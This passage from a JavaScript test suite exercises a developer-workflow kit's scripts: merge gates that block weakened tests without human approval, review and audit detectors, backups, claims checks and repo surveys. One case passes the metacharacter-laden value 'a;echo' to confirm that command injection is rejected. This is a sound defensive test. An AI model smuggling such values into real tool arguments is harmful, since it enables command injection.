    if (exApprove.status !== 0 || !JSON.parse(exApprove.stdout).critiqueSkipped) {
      return `--skip-critique-reason 豁免失败：${exApprove.stderr}`
    }
    return true
  } finally { rmTree(dir) }
}])

cases.push(['flow.mjs Wave 2 契约：smoke --target 替换与缺参阻断、门禁弱化阻断与人工豁免、干净增量测试放行', async () => {
  const dir = tmpProject({
    '.gitignore': '.worktrees/\n',
    'AGENTS.md': [
      '# flow-w2',
      '',
      '```yaml',
      'quick-test: node -e "process.exit(0)"',
      'smoke-verify: node scripts/smoke.mjs --file {target}',
      'high-risk: none',
      '```',
      '',
    ].join('\n'),
    'package.json': '{"name":"flow-w2","version":"1.0.0"}\n',
    'scripts/smoke.mjs': 'import { existsSync } from "node:fs"\nconst f = process.argv[process.argv.indexOf("--file") + 1]\nif (!existsSync(f)) process.exit(2)\n',
    'src/ok.mjs': 'export const ok = 1\n',
    'test/ok.test.mjs': 'import assert from "node:assert/strict"\nassert.equal(1, 1)\nassert.equal(2, 2)\n',
  })
  gitInit(dir)
  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.name', 't'], { cwd: dir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: dir, stdio: 'ignore' })

  try {
    // 1. smoke --target 缺参 / 元字符阻断 / 正常替换
    const s1 = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-w2', '--case', '1', '--slug', 'w2-gate', '--json'], { cwd: dir })
    if (s1.status !== 0) return `start t-w2 失败：${s1.stderr}`

    const missTarget = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-w2', '--mode', 'smoke'], { cwd: dir })
    if (missTarget.status === 0 || !/MISSING_TARGET_ARG/.test(missTarget.stderr)) {
      return `smoke 缺 --target 未拦截：${missTarget.stderr}`
    }
    const badTarget = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-w2', '--mode', 'smoke', '--target', 'a;echo'], { cwd: dir })
    if (badTarget.status === 0 || !/INVALID_TARGET_ARG/.test(badTarget.stderr)) {
      return `smoke 非法元字符 --target 未拦截：${badTarget.stderr}`
    }
    const okSmoke = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-w2', '--mode', 'smoke', '--target', 'src/ok.mjs', '--json'], { cwd: dir })
    if (okSmoke.status !== 0) return `smoke --target src/ok.mjs 失败：${okSmoke.stderr}`
    if (!JSON.parse(okSmoke.stdout).cmd.includes('src/ok.mjs')) return `smoke 未替换 {target}：${okSmoke.stdout}`

    // 2. 删减测试断言（门禁弱化）-> verify 后 merge 必须 exit 4 (BLOCKED_GATE_WEAKENING)
    writeFileSync(join(dir, 'test/ok.test.mjs'), 'import assert from "node:assert/strict"\n')
    spawnSync('git', ['add', '-A'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'weaken test'], { cwd: dir, stdio: 'ignore' })

    const vWeak = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-w2', '--cmd', 'node -e "process.exit(0)"'], { cwd: dir })
    if (vWeak.status !== 0) return `verify 失败：${vWeak.stderr}`

    const mGate = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['merge', '--task', 't-w2', '--json'], { cwd: dir })
    if (mGate.status !== 4) return `门禁弱化改动未被 merge 拦截：exit=${mGate.status} out=${mGate.stdout} err=${mGate.stderr}`
    if (JSON.parse(mGate.stdout).code !== 'BLOCKED_GATE_WEAKENING') return `缺少 BLOCKED_GATE_WEAKENING：${mGate.stdout}`

    // 3. 人工豁免 --human-approved 放行并入 main
    const mApproved = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['merge', '--task', 't-w2', '--human-approved', '--json'], { cwd: dir })
    if (mApproved.status !== 0 || JSON.parse(mApproved.stdout).status !== 'merged') {
      return `--human-approved merge 失败：exit=${mApproved.status} out=${mApproved.stdout} err=${mApproved.stderr}`
    }

    // 4. 反面证伪：新增测试断言（非弱化）无 --human-approved 直接合并放行
    const s2 = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-w2-clean', '--case', '1', '--slug', 'w2-clean', '--json'], { cwd: dir })
    if (s2.status !== 0) return `start t-w2-clean 失败：${s2.stderr}`
    writeFileSync(join(dir, 'test/ok.test.mjs'), 'import assert from "node:assert/strict"\nassert.equal(3, 3)\n')
    spawnSync('git', ['add', '-A'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'add assertion'], { cwd: dir, stdio: 'ignore' })
    runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-w2-clean', '--cmd', 'node -e "process.exit(0)"'], { cwd: dir })
    const mClean = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['merge', '--task', 't-w2-clean', '--json'], { cwd: dir })
    if (mClean.status !== 0) return `正常增量测试被 merge 误杀为门禁弱化：exit=${mClean.status} out=${mClean.stdout} err=${mClean.stderr}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['review-pack.mjs Wave 2 扩展：双轨门禁、arch-rules、tombstone/excuse 检出与 two-way/one-way 误伤防线', async () => {
  const dir = tmpProject({
    'AGENTS.md': [
      '# rev-w2',
      '',
      '```yaml',
      'smoke-verify: node -e "process.exit(0)"',
      'arch-rules: src/ui/** -> src/db/**',
      '```',
      '',
    ].join('\n'),
    'src/db/conn.mjs': 'export const query = () => []\n',
    'src/shared/fmt.mjs': 'export const fmt = (v) => String(v)\n',
    'src/ui/good.mjs': 'import { fmt } from "../shared/fmt.mjs"\nexport const render = (v) => fmt(v)\n',
  })
  gitInit(dir)
  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })

  try {
    // 1. 正向干净改动（正常注释 + 合法跨模块引用）-> structural clean & two-way & behavioral smokeRequired
    writeFileSync(join(dir, 'src/ui/good.mjs'), '// Format user value safely\nimport { fmt } from "../shared/fmt.mjs"\nexport const render = (v) => fmt(v)\n')
    const pClean = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--json'], { cwd: dir })
    if (pClean.status !== 0) return `review-pack --local 干净改动失败：${pClean.stderr}`
    const cj = JSON.parse(pClean.stdout)
    if (!cj.behavioralGate?.smokeRequired || !cj.behavioralGate.runtimeFilesTouched.includes('src/ui/good.mjs')) {
      return `behavioralGate 未识别运行时改动与 smoke-verify：${JSON.stringify(cj.behavioralGate)}`
    }
    if ((cj.structuralGate?.archViolations?.length ?? 0) !== 0 || (cj.structuralGate?.excuseSuppressions?.length ?? 0) !== 0 || (cj.structuralGate?.tombstoneComments?.length ?? 0) !== 0) {
      return `干净改动被 structuralGate 误报：${JSON.stringify(cj.structuralGate)}`
    }
    if (cj.doorAssessment?.doorType !== 'two-way' || cj.doorAssessment?.mergeAuthority !== 'reviewer-direct') {
      return `普通改动门型误判：${JSON.stringify(cj.doorAssessment)}`
    }

    // 2. 越界依赖 + 墓碑注释 + excuse suppression + workflow 改动 -> attention-required + one-way
    writeFileSync(join(dir, 'src/ui/bad.mjs'), [
      '// 以前是同步调用，后来改成异步查询',
      '// eslint-disable-next-line no-unused-vars',
      'import { query } from "../db/conn.mjs"',
      'export const load = () => query()',
    ].join('\n'))
    mkdirSync(join(dir, '.github', 'workflows'), { recursive: true })
    writeFileSync(join(dir, '.github', 'workflows', 'ci.yml'), 'name: CI\non: push\n')

    const pBad = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--json'], { cwd: dir })
    if (pBad.status !== 0) return `review-pack --local 坏改动运行失败：${pBad.stderr}`
    const bj = JSON.parse(pBad.stdout)
    if ((bj.structuralGate?.archViolations?.length ?? 0) < 1) return `未检出 arch-rules 违例：${JSON.stringify(bj.structuralGate)}`
    if ((bj.structuralGate?.tombstoneComments?.length ?? 0) < 1) return `未检出墓碑注释：${JSON.stringify(bj.structuralGate)}`
    if ((bj.structuralGate?.excuseSuppressions?.length ?? 0) < 1) return `未检出 excuse suppression：${JSON.stringify(bj.structuralGate)}`
    if (bj.structuralGate?.status !== 'attention-required') return `structuralGate 状态不对：${bj.structuralGate?.status}`
    if (bj.doorAssessment?.doorType !== 'one-way' || bj.doorAssessment?.mergeAuthority !== 'human-required') {
      return `CI workflow 改动未判为 one-way + human-required：${JSON.stringify(bj.doorAssessment)}`
    }
    return true
  } finally { rmTree(dir) }
}])

cases.push(['govern-audit.mjs Wave 2 扩展：fence-aware 死链接、注释死代码、上帝文件、arch-rules、4 态 worktree 与 record/cluster/sample', async () => {
  const godLines = Array.from({ length: 820 }, (_, i) => `export const k${i} = ${i}`).join('\n') + '\n'
  const dir = tmpProject({
    '.gitignore': '.worktrees/\n',
    'AGENTS.md': '# gov-w2\n\n```yaml\narch-rules: src/ui/** -> src/db/**\n```\n',
    'README.md': '# gov-w2\n',
    'docs/TDD.md': '# TDD\n',
    'docs/guide.md': [
      '# Guide',
      '',
      '```markdown',
      '[in-fence](docs/nonexistent-in-fence.md)',
      '```',
      '',
      'Inline code `[in-code](docs/nonexistent-inline.md)` should pass.',
      '',
      'Real broken [real-dead](docs/actually-missing.md).',
    ].join('\n'),
    'src/db/db.mjs': 'export const db = 1\n',
    'src/ui/view.mjs': [
      '// normal header note line 1',
      '// normal header note line 2',
      '// normal header note line 3',
      '// normal header note line 4',
      '// normal prose comment without code',
      '// line two prose comment',
      '// line three prose comment',
      '// line four prose comment',
      'import { db } from "../db/db.mjs"',
      'export const view = () => db',
      '// const deadA = 1;',
      '// if (deadA > 0) {',
      '//   return deadA;',
      '// }',
    ].join('\n'),
    'src/big.mjs': godLines,
    'src/hot.mjs': 'export const h = 0\n',
  })
  gitInit(dir)
  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.name', 't'], { cwd: dir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: dir, stdio: 'ignore' })

  const wtMerged = join(dir, '.worktrees', 'wt-merged')
  const wtSquash = join(dir, '.worktrees', 'wt-squash')
  const wtNoOwn = join(dir, '.worktrees', 'wt-no-own')
  const wtUnmerged = join(dir, '.worktrees', 'wt-unmerged')

  try {
    // 构造 4 态 worktree + 1 个 Revert 与 3 次高频修改提交给 sample
    spawnSync('git', ['checkout', '-qb', 'wt-merged'], { cwd: dir, stdio: 'ignore' })
    writeFileSync(join(dir, 'src/merged.mjs'), 'export const m = 1\n')
    spawnSync('git', ['add', '-A'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'merged commit'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['checkout', '-q', 'main'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['merge', '--no-ff', 'wt-merged', '-qm', 'merge wt-merged'], { cwd: dir, stdio: 'ignore' })

    spawnSync('git', ['checkout', '-qb', 'wt-squash'], { cwd: dir, stdio: 'ignore' })
    writeFileSync(join(dir, 'src/sq.mjs'), 'export const sq = 1\n')
    spawnSync('git', ['add', '-A'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'squash feat'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['checkout', '-q', 'main'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['merge', '--squash', '-q', 'wt-squash'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'squash feat onto main'], { cwd: dir, stdio: 'ignore' })

    for (let k = 1; k <= 3; k += 1) {
      writeFileSync(join(dir, 'src/hot.mjs'), `export const h = ${k}\n`)
      spawnSync('git', ['add', 'src/hot.mjs'], { cwd: dir, stdio: 'ignore' })
      spawnSync('git', ['commit', '-qm', `touch hot ${k}`], { cwd: dir, stdio: 'ignore' })
    }
    writeFileSync(join(dir, 'src/hot.mjs'), 'export const h = 2\n')
    spawnSync('git', ['add', 'src/hot.mjs'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'Revert "touch hot 3"'], { cwd: dir, stdio: 'ignore' })

    spawnSync('git', ['branch', 'wt-no-own', 'main'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['branch', 'wt-unmerged', 'main'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['worktree', 'add', '-q', wtMerged, 'wt-merged'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['worktree', 'add', '-q', wtSquash, 'wt-squash'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['worktree', 'add', '-q', wtNoOwn, 'wt-no-own'], { cwd: dir, stdio: 'ignore' })
    writeFileSync(join(wtNoOwn, 'wip.txt'), 'uncommitted note\n')
    spawnSync('git', ['worktree', 'add', '-q', wtUnmerged, 'wt-unmerged'], { cwd: dir, stdio: 'ignore' })
    writeFileSync(join(wtUnmerged, 'src/unmerged.mjs'), 'export const u = 1\n')
    spawnSync('git', ['add', '-A'], { cwd: wtUnmerged, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'unique unmerged commit'], { cwd: wtUnmerged, stdio: 'ignore' })

    // 1. reconcile（4 态 worktree）+ audit 全类别扫描验证
    const rec = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['reconcile', dir, '--json'])
    if (rec.status !== 0) return `govern-audit reconcile 失败：${rec.stderr}`
    const rj = JSON.parse(rec.stdout)

    const aud = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['audit', dir, '--json'])
    if (aud.status !== 0) return `govern-audit audit 失败：${aud.stderr}`
    const aj = JSON.parse(aud.stdout)
    const ids = aj.findings.map((f) => f.id)
    if (ids.some((id) => id.includes('nonexistent-in-fence') || id.includes('nonexistent-inline'))) {
      return `围栏代码块内相对链接被误判为死链接：${JSON.stringify(ids)}`
    }
    if (!ids.some((id) => id.includes('actually-missing.md'))) return `真实死链接未被检出：${JSON.stringify(ids)}`
    if (!ids.some((id) => id.startsWith('deadcode.commented-block.src/ui/view.mjs:11'))) {
      return `注释死代码块未检出或把普通注释误报了：${JSON.stringify(ids)}`
    }
    if (ids.some((id) => id.startsWith('deadcode.commented-block.src/ui/view.mjs:5'))) {
      return `普通自然语言注释块被误判为死代码：${JSON.stringify(ids)}`
    }
    if (!ids.includes('hygiene.god-file.src/big.mjs')) return `上帝文件未检出：${JSON.stringify(ids)}`
    if (!ids.some((id) => id.startsWith('hygiene.arch-boundary.src/ui/view.mjs:'))) {
      return `arch-rules 边界违例未检出：${JSON.stringify(ids)}`
    }

    const wc = rj.reconcileSummary?.worktrees?.counts ?? {}
    if (wc.merged !== 1 || wc.squash_or_rebase_merged !== 1 || wc.no_own_commits !== 1 || wc.unmerged !== 1) {
      return `worktree 四态识别数量有误：${JSON.stringify(rj.reconcileSummary?.worktrees)}`
    }

    // 2. record -> cluster -> sample
    const r1 = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['record', dir, '--module', 'src/ui', '--pattern', 'arch-boundary', '--message', 'direct db import', '--json'])
    if (r1.status !== 0 || JSON.parse(r1.stdout).ruleSinkCandidate !== false) return `首次 record 判据有误：${r1.stdout}`
    const r2 = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['record', dir, '--module', 'src/ui', '--pattern', 'arch-boundary', '--message', 'second db import', '--json'])
    if (r2.status !== 0 || JSON.parse(r2.stdout).ruleSinkCandidate !== true || JSON.parse(r2.stdout).modulePatternCount !== 2) {
      return `二次 record 未触发下沉候选：${r2.stdout}`
    }

    const cl = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['cluster', dir, '--signals-only', '--json'])
    if (cl.status !== 0) return `cluster 失败：${cl.stderr}`
    const clj = JSON.parse(cl.stdout)
    if ((clj.cluster?.sinkCandidateCount ?? 0) < 1) return `cluster 未识别下沉候选：${cl.stdout}`

    const smp = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['sample', dir, '--commits', '20', '--json'])
    if (smp.status !== 0) return `sample 失败：${smp.stderr}`
    const sj = JSON.parse(smp.stdout)
    if (sj.revertCount < 1 || !sj.reworkHotspots?.some((h) => h.file === 'src/hot.mjs')) {
      return `sample 未识别 Revert 与 48h 高频返工热点：${smp.stdout}`
    }
    return true
  } finally {
    for (const wt of [wtMerged, wtSquash, wtNoOwn, wtUnmerged]) {
      spawnSync('git', ['worktree', 'remove', '--force', wt], { cwd: dir, stdio: 'ignore' })
    }
    rmTree(dir)
  }
}])

cases.push(['backup.mjs Wave 3 去重：treeSha256 同内容跳过 unchanged-since-latest、--force 强制与变更重建', async () => {
  const backupStore = mkdtempSync(join(tmpdir(), 'pf-bk3-'))
  const bkEnv = { ...process.env, PF_BACKUP_DIR: backupStore }
  const dir = tmpProject({
    'package.json': '{"name":"bk-w3","version":"1.0.0"}\n',
    'src/index.mjs': 'export const v = 1\n',
  })

  try {
    const c1 = runAbs('scripts/backup.mjs', ['create', dir, '--label', 'pre-forge', '--json'], { env: bkEnv })
    if (c1.status !== 0) return `pre-forge backup 失败：${c1.stderr}`
    const j1 = JSON.parse(c1.stdout)
    if (!j1.created || !j1.treeSha256) return `首次快照缺少 treeSha256：${c1.stdout}`

    // 工作区未变动时立即再次调用 -> 命中 unchanged-since-latest 且不增加快照数
    const c2 = runAbs('scripts/backup.mjs', ['create', dir, '--label', 'equip', '--json'], { env: bkEnv })
    if (c2.status !== 0) return `二次去重调用失败：${c2.stderr}`
    const j2 = JSON.parse(c2.stdout)
    if (j2.created || j2.skippedReason !== 'unchanged-since-latest' || j2.id !== j1.id) {
      return `相同工作区二次快照未触发 unchanged-since-latest 去重：${c2.stdout}`
    }

    // 传 --force 必须无视去重写入新快照
    const c3 = runAbs('scripts/backup.mjs', ['create', dir, '--label', 'equip', '--force', '--json'], { env: bkEnv })
    if (c3.status !== 0) return `--force backup 失败：${c3.stderr}`
    const j3 = JSON.parse(c3.stdout)
    if (!j3.created || j3.id === j1.id) return `--force 未生成新快照：${c3.stdout}`

    // 修改文件内容 -> treeSha256 变化并写入新快照
    writeFileSync(join(dir, 'src/index.mjs'), 'export const v = 2\n')
    const c4 = runAbs('scripts/backup.mjs', ['create', dir, '--label', 'edit', '--json'], { env: bkEnv })
    if (c4.status !== 0) return `变更后 backup 失败：${c4.stderr}`
    const j4 = JSON.parse(c4.stdout)
    if (!j4.created || !j4.treeSha256 || j4.treeSha256 === j1.treeSha256) {
      return `文件变更后未生成新 treeSha256 快照：${c4.stdout}`
    }

    const ls = JSON.parse(runAbs('scripts/backup.mjs', ['list', dir, '--json'], { env: bkEnv }).stdout)
    if ((ls.backups?.length ?? 0) !== 3) return `预期保留 3 份快照，实际：${ls.backups?.length}`
    return true
  } finally {
    rmTree(dir)
    rmTree(backupStore)
  }
}])

cases.push(['claims.mjs + review.mjs Wave 3：dirs 并入 claim.path、claim.script 核对与零误报防线', async () => {
  const { claimsOf, verifyClaims } = await import('../lib/claims.mjs')
  const { reviewProject } = await import('../review.mjs')

  const dir = tmpProject({
    'package.json': JSON.stringify({
      name: 'claims-w3',
      version: '1.0.0',
      scripts: { test: 'node --test', lint: 'echo ok' },
    }),
    'README.md': '# claims-w3\n\n测试契约脚本与目录前缀核对的仓库说明。\n',
    'docs/TDD.md': '# TDD\n',
    'src/core/app.mjs': 'export const app = 1\n',
    'AGENTS.md': [
      '# claims-w3',
      '',
      '## Dev Profile',
      '',
      '```yaml',
      'quick-test: npm test',
      'full-test: npm run nonexistent-full',
      'high-risk: src/core/, src/payments/, src/legacy/**, .github/workflows/, none',
      'do-not-edit: docs/missing-archive/, .worktrees/',
      '```',
      '',
      '## 环境与构建验证',
      '',
      '```sh',
      'npm run lint',
      'pnpm run nonexistent-check',
      'npm test # 注释里带 npm run <placeholder> 不应提取',
      '```',
      '',
      '## 高风险路径',
      '',
      '| 路径 | 原因 |',
      '| --- | --- |',
      '| `src/core/` | 核心目录存在 |',
      '| `src/removed-dir/` | 已删除目录 |',
      '',
    ].join('\n'),
  })
  gitInit(dir)

  try {
    const agentsText = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    const c = claimsOf(agentsText)
    for (const expectedDir of ['src/core/', 'src/payments/', 'src/removed-dir/', 'docs/missing-archive/']) {
      if (!c.dirs.includes(expectedDir)) return `claimsOf 未提取目录前缀 ${expectedDir}：${JSON.stringify(c.dirs)}`
    }
    if (c.dirs.some((d) => d.includes('legacy') || d.includes('.github') || d.includes('.worktrees'))) {
      return `claimsOf 误把通配符或可选设施列入 dirs：${JSON.stringify(c.dirs)}`
    }
    for (const expectedScript of ['test', 'lint', 'nonexistent-full', 'nonexistent-check']) {
      if (!c.scripts.includes(expectedScript)) return `claimsOf 未提取脚本 ${expectedScript}：${JSON.stringify(c.scripts)}`
    }
    if (c.scripts.some((s) => s.includes('placeholder'))) return `claimsOf 误从注释提取脚本：${JSON.stringify(c.scripts)}`

    const rev = await reviewProject(dir)
    const missingIds = new Set(rev.missing.map((f) => f.id))
    if (!missingIds.has('claim.path')) return `review.mjs 未把失效目录前缀报进 claim.path：${JSON.stringify([...missingIds])}`
    if (!missingIds.has('claim.script')) return `review.mjs 未拦截失效 package.json 脚本：${JSON.stringify([...missingIds])}`

    // 反面防误报：无 packageScripts 时不输出假绿也不误报；本仓自身 0 缺失项
    const noPkgClaims = verifyClaims(agentsText, { conventions: { defaultBranch: 'main' }, ecosystem: {} }, () => true)
    if (noPkgClaims.some((x) => x.id === 'claim.script')) {
      return `无 package.json 脚本清单时不应产生 claim.script 条目：${JSON.stringify(noPkgClaims)}`
    }
    const selfRev = await reviewProject(SKILL_ROOT)
    if (selfRev.missing.length > 0) return `本仓库自身 review 存在误报缺失项：${JSON.stringify(selfRev.missing)}`
    return true
  } finally {
    rmTree(dir)
  }
}])

cases.push(['survey.mjs + compose-agents.mjs Wave 3：自有技能共存路由、reentry 漂移校准、explorationStrategy 与纯本地非 GitHub 提示', async () => {
  const { toMarkdown } = await import('../lib/render.mjs')
  const { FORBIDDEN_PLATFORM_RE } = await import('../lib/protocol.mjs')
  const { equip } = await import('../equip.mjs')

  // 1. 自有扩展技能（.agents/skills + .claude/skills）自动进入 AGENTS.md 意图路由且与 --check / equip 共存
  const customDir = tmpProject({
    'package.json': JSON.stringify({ name: 'custom-sk', version: '1.0.0', scripts: { test: 'node --test' } }),
    'README.md': '# custom-sk\n\n自有扩展技能并存与重入测试项目。\n',
    'src/app.mjs': 'export const ok = 1\n',
    '.agents/skills/my-billing/SKILL.md': [
      '---',
      'name: my-billing',
      'description: Reconcile invoices and ledger entries cleanly. Ignore second sentence details.',
      '---',
      '# my-billing',
    ].join('\n'),
    '.claude/skills/deploy-guard/SKILL.md': [
      '---',
      'name: deploy-guard',
      'description: Pre-deploy verification checklist for production releases',
      '---',
      '# deploy-guard',
    ].join('\n'),
  })
  gitInit(customDir)

  // 2. 跨月重入漂移仓（AGENTS 失效路径+脚本、TDD 失效路径、未登记 src/new-module、非 GitHub 远端）
  const reentryDir = tmpProject({
    'package.json': JSON.stringify({ name: 'reentry-demo', version: '1.0.0', scripts: { test: 'node --test' } }),
    'README.md': '# reentry-demo\n\n跨月重入校准与非 GitHub 远端导航测试仓。\n',
    'src/existing.mjs': 'export const e = 1\n',
    'src/new-module/service.mjs': 'export const s = 2\n',
    'docs/TDD.md': [
      '# TDD',
      '',
      '现有模块 `src/existing.mjs`，已删源码 `src/deleted-tdd.mjs`。',
      '未来规划示例 `docs/future/plan.md` 与外链 `https://example.com/a.js` 不应误报。',
    ].join('\n'),
    'AGENTS.md': [
      '# reentry-demo',
      '',
      '## Dev Profile',
      '```yaml',
      'quick-test: npm test',
      'full-test: npm run removed-script',
      '```',
      '',
      '## 架构',
      '核心文件：`src/existing.mjs`、`src/old/deleted.mjs`。',
    ].join('\n'),
  })
  gitInit(reentryDir)
  spawnSync('git', ['remote', 'add', 'origin', 'https://code.example.org/org/reentry-demo.git'], { cwd: reentryDir, stdio: 'ignore' })

  // 3. 空目录与小型干净仓 vs 大仓（> 80 代码文件）explorationStrategy 分级
  const emptyDir = tmpProject({})
  const smallCleanDir = tmpProject({
    'package.json': JSON.stringify({ name: 'small-clean', version: '1.0.0', scripts: { test: 'node --test' } }),
    'README.md': '# small-clean\n\n小型干净单仓。\n',
    'src/only.mjs': 'export const a = 1\n',
  })
  gitInit(smallCleanDir)
  const largeFiles = { 'README.md': '# large-repo\n\n大仓多文件分片探索测试。\n', 'package.json': '{"name":"large-repo","version":"1.0.0"}\n' }
  for (let i = 0; i < 85; i += 1) largeFiles[`src/m${i}.mjs`] = `export const v${i} = ${i}\n`
  const largeDir = tmpProject(largeFiles)

  try {
    // 验证自有技能装配、渲染共存与卸载恢复
    equip(customDir, { noBackup: true })
    const gen1 = runAbs('scripts/compose-agents.mjs', [customDir, '--no-backup'])
    if (gen1.status !== 0) return `compose-agents customDir 失败：${gen1.stderr}`
    const filledCustom = readFileSync(join(customDir, 'AGENTS.md'), 'utf8')
      .replace(/^<!-- project-forge: fill [^\n]*-->$/gm, '已填写。')
    writeFileSync(join(customDir, 'AGENTS.md'), filledCustom)

    const agentsCustom = readFileSync(join(customDir, 'AGENTS.md'), 'utf8')
    if (!agentsCustom.includes('### 项目自有技能（自动识别，与上方研发流并存）') || !agentsCustom.includes('.agents/skills/my-billing/SKILL.md') || !agentsCustom.includes('.claude/skills/deploy-guard/SKILL.md')) {
      return `AGENTS.md 未包含项目自有扩展技能路由块：\n${agentsCustom.slice(0, 1200)}`
    }
    const chkCustom = runAbs('scripts/compose-agents.mjs', [customDir, '--check'])
    if (chkCustom.status !== 0) return `含自有技能的 AGENTS.md --check 失败：${chkCustom.stderr}`

    const sCustom = await survey(customDir)
    if ((sCustom.kit?.customSkills?.length ?? 0) !== 2 || !sCustom.kit.customSkills.some((s) => s.name === 'my-billing' && s.summary)) {
      return `survey customSkills 识别不对：${JSON.stringify(sCustom.kit?.customSkills)}`
    }

    // 删掉自有技能 -> 重跑 compose-agents 后自有技能区块消失
    rmTree(join(customDir, '.agents/skills/my-billing'))
    rmTree(join(customDir, '.claude/skills/deploy-guard'))
    runAbs('scripts/compose-agents.mjs', [customDir, '--no-backup'])
    if (readFileSync(join(customDir, 'AGENTS.md'), 'utf8').includes('### 项目自有技能')) {
      return '移除自有技能后 AGENTS.md 未清理自有技能条件块'
    }

    // 验证重入漂移、docs.tdd-stale-paths 与非 GitHub 远端无禁词渲染
    const sRe = await survey(reentryDir)
    if (!sRe.reentry?.isReentry || !sRe.reentry?.drifted) return `重入仓未检出 drifted：${JSON.stringify(sRe.reentry)}`
    if (!sRe.reentry.staleAgentPaths.includes('src/old/deleted.mjs')) return `staleAgentPaths 漏检：${JSON.stringify(sRe.reentry)}`
    if (!sRe.reentry.staleAgentScripts.includes('removed-script')) return `staleAgentScripts 漏检：${JSON.stringify(sRe.reentry)}`
    if (!sRe.reentry.staleTddPaths.includes('src/deleted-tdd.mjs')) return `reentry.staleTddPaths 未检出失效 TDD 路径：${JSON.stringify(sRe.reentry)}`
    if (sRe.reentry.staleTddPaths.some((p) => p.includes('docs/future') || p.includes('example.com'))) {
      return `staleTddPaths 误报了未来路径或 URL：${JSON.stringify(sRe.reentry.staleTddPaths)}`
    }
    if (!sRe.reentry.unregisteredTopDirs.includes('src/new-module')) {
      return `unregisteredTopDirs 未检出新增顶层目录：${JSON.stringify(sRe.reentry.unregisteredTopDirs)}`
    }
    if (sRe.explorationStrategy?.tier !== 'parallel-subagents' || !sRe.explorationStrategy.shards.some((s) => s.id === 'conventions-and-skills')) {
      return `重入漂移仓未切换 parallel-subagents：${JSON.stringify(sRe.explorationStrategy)}`
    }

    const mdRe = toMarkdown(sRe)
    if (FORBIDDEN_PLATFORM_RE.test(mdRe)) return '非 GitHub 远端导航或 Markdown 渲染输出了受限平台词汇'
    if (!mdRe.includes('远端不在 GitHub 上') || !mdRe.includes('跨月重入失步校准')) {
      return `toMarkdown 缺少非 GitHub 声明或重入校准摘要：\n${mdRe}`
    }

    const revRe = runAbs('scripts/review.mjs', [reentryDir])
    if (revRe.status !== 0 && !revRe.stdout) return `review.mjs reentryDir 异常退出：${revRe.stderr}`
    const { reviewProject } = await import('../review.mjs')
    const revReObj = await reviewProject(reentryDir)
    if (!revReObj.missing.some((f) => f.id === 'docs.tdd-stale-paths')) {
      return `review.mjs 未产出 docs.tdd-stale-paths：${JSON.stringify(revReObj.missing)}`
    }

    // 验证 explorationStrategy 三档分级：empty -> none、small -> single-pass、>80 files -> parallel-subagents
    const [sEmpty, sSmall, sLarge] = await Promise.all([survey(emptyDir), survey(smallCleanDir), survey(largeDir)])
    if (sEmpty.explorationStrategy?.tier !== 'none') return `empty 目录探索策略错误：${JSON.stringify(sEmpty.explorationStrategy)}`
    if (sSmall.explorationStrategy?.tier !== 'single-pass') return `小型干净仓探索策略错误：${JSON.stringify(sSmall.explorationStrategy)}`
    if (sLarge.explorationStrategy?.tier !== 'parallel-subagents') return `大型仓未触发 parallel-subagents：${JSON.stringify(sLarge.explorationStrategy)}`

    return true
  } finally {
    rmTree(customDir)
    rmTree(reentryDir)
    rmTree(emptyDir)
    rmTree(smallCleanDir)
    rmTree(largeDir)
  }
}])

function parseCliFlags(argv) {
  let prefer = ''
  let bailOn = ''
  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i]
    if (arg === '--prefer' && i + 1 < argv.length) { prefer = argv[++i]; continue }
    if (arg.startsWith('--prefer=')) { prefer = arg.slice('--prefer='.length); continue }
    if (arg === '--bail-on' && i + 1 < argv.length) { bailOn = argv[++i]; continue }
    if (arg.startsWith('--bail-on=')) { bailOn = arg.slice('--bail-on='.length); continue }
  }
  return { prefer, bailOn }
}

const { prefer, bailOn } = parseCliFlags(process.argv.slice(2))
const orderedCases = prefer
  ? [
